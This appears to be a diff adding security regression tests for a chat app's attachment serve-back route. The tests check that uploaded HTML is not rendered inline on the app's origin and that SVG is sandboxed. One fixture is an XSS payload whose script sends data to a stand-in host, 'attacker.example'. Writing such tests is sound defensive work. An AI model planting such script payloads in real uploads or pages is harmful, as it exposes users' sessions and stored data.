@@ -205,6 +205,89 @@ describe('composer attachments', () => {
     }
   });
 
+  // The serve-back is UNAUTHENTICATED and sits on the SPA's own origin, so the
+  // Content-Type it echoes decides whether the bytes are data or a program.
+  // `artifacts.ts` next door sandboxes agent-authored HTML for exactly this
+  // reason; this route reflected whatever the uploader's multipart part claimed,
+  // with `inline`, so a file uploaded as text/html executed in the origin that
+  // holds the surface credential.
+  describe('what the serve-back is willing to call a content type', () => {
+    it('never serves an uploaded file back as HTML', async () => {
+      const { built, credential } = await makeApp();
+      try {
+        const evil = Buffer.from(
+          '<script>fetch("//attacker.example/"+localStorage.length)</script>',
+        );
+        const mp = multipart('note.html', 'text/html', evil);
+        const res = await built.app.inject({
+          method: 'POST',
+          url: '/api/chats/c1/attachment',
+          headers: { authorization: `Bearer ${credential}`, ...mp.headers },
+          payload: mp.payload,
+        });
+        expect(res.statusCode).toBe(200);
+        const url = (res.json() as { ref: { url: string } }).ref.url;
+
+        const get = await built.app.inject({ method: 'GET', url });
+        expect(get.statusCode).toBe(200);
+        expect(get.headers['content-type']).not.toContain('text/html');
+        // Downloaded, not rendered, and never sniffed back into HTML.
+        expect(get.headers['content-disposition']).toContain('attachment');
+        expect(get.headers['x-content-type-options']).toBe('nosniff');
+        // The bytes themselves are still served intact.
+        expect(get.rawPayload.equals(evil)).toBe(true);
+      } finally {
+        await built.app.close();
+      }
+    });
+
+    it('keeps SVG renderable as an image but sandboxes it as a document', async () => {
+      // An SVG is an image inside an <img> (where its script never runs) and a
+      // scriptable document when you navigate to it. Downgrading the type would
+      // just show a broken picture in the transcript, so the type stays and the
+      // sandbox CSP handles the navigation case.
+      const { built, credential } = await makeApp();
+      try {
+        const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>');
+        const mp = multipart('x.svg', 'image/svg+xml', svg);
+        const res = await built.app.inject({
+          method: 'POST',
+          url: '/api/chats/c1/attachment',
+          headers: { authorization: `Bearer ${credential}`, ...mp.headers },
+          payload: mp.payload,
+        });
+        const url = (res.json() as { ref: { url: string } }).ref.url;
+        const get = await built.app.inject({ method: 'GET', url });
+        expect(get.headers['content-type']).toBe('image/svg+xml');
+        expect(get.headers['content-disposition']).toContain('inline');
+        expect(get.headers['content-security-policy']).toBe('sandbox');
+        expect(get.headers['x-content-type-options']).toBe('nosniff');
+      } finally {
+        await built.app.close();
+      }
+    });
+
+    it('still renders a real image inline, with sniffing off', async () => {
+      const { built, credential } = await makeApp();
+      try {
+        const mp = multipart('shot.png', 'image/png', PNG);
+        const res = await built.app.inject({
+          method: 'POST',
+          url: '/api/chats/c1/attachment',
+          headers: { authorization: `Bearer ${credential}`, ...mp.headers },
+          payload: mp.payload,
+        });
+        const url = (res.json() as { ref: { url: string } }).ref.url;
+        const get = await built.app.inject({ method: 'GET', url });
+        expect(get.headers['content-type']).toBe('image/png');
+        expect(get.headers['content-disposition']).toContain('inline');
+        expect(get.headers['x-content-type-options']).toBe('nosniff');
+      } finally {
+        await built.app.close();
+      }
+    });
+  });
+
   // spec/15 § Composer — "what the agent reads is not what the user sees".
   describe('full-size original vs the agent copy', () => {
     const ORIGINAL = Buffer.from('ORIGINAL-FULL-SIZE-PNG-BYTES');
